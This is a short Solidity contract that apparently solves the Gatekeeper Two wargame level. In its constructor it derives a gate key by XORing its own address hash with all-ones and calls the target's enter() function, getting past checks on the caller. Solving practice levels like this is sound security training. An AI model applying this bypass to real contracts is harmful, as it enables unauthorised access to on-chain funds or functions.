// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface ILevel {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoRun { 

    constructor(address _runAddress){
        //gateThree:require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
        //结果再异或下
        uint64 gateKey;
        unchecked {
            gateKey = (uint64(0) - 1) ^
                uint64(bytes8(keccak256(abi.encodePacked(address(this))))); 
        }
        ILevel(_runAddress).enter(bytes8(gateKey));
    }
    
}